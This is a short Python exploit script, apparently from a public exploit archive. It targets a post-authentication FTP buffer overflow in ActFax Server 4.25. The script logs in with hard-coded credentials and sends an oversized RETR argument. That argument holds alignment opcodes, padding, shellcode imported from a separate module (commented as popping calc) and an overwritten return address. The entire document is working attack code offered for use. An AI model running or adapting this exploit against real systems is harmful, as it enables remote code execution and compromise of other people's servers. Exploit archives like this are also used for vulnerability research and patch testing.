#!/usr/bin/python
# Exploit Title: ActFax Server FTP Remote BOF (post auth)
# Date: Feb 15, 2011
# Author: chap0
# Software Link: http://www.actfax.com/download/actfax_setup_en.exe
# Version: Version 4.25, Build 0221 (2010-02-11)
# Tested on: Windows XP SP3 en
# Big thanks to Sud0 - and an extra greetz to mr_me -RESPECT
# Stay true my friends

import socket
from payload import buf
import sys
def shell_attack(target_machine, target_port):

# pops calc

    # push ebp #pop eax #sub eax,55555521 * 3 :)
    junk = b"\x55\x58\x2D\x21\x55\x55\x55\x2D\x21\x55\x55\x55\x2D\x21\x55\x55\x55" + b"C"*135 + buf + b"A"*(616-len(buf))

    payload = junk + b"\x37\x27\x40\x00" #RETN

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((target_machine,target_port))
    s.recv(1024)
    s.send(b'USER ' + b'chapo\r\n')
    print (s.recv(1024))
    s.send(b'PASS chapo\r\n')
    print (s.recv(1024))
    s.send(b'RETR ' + payload + b'\r\n')
    s.close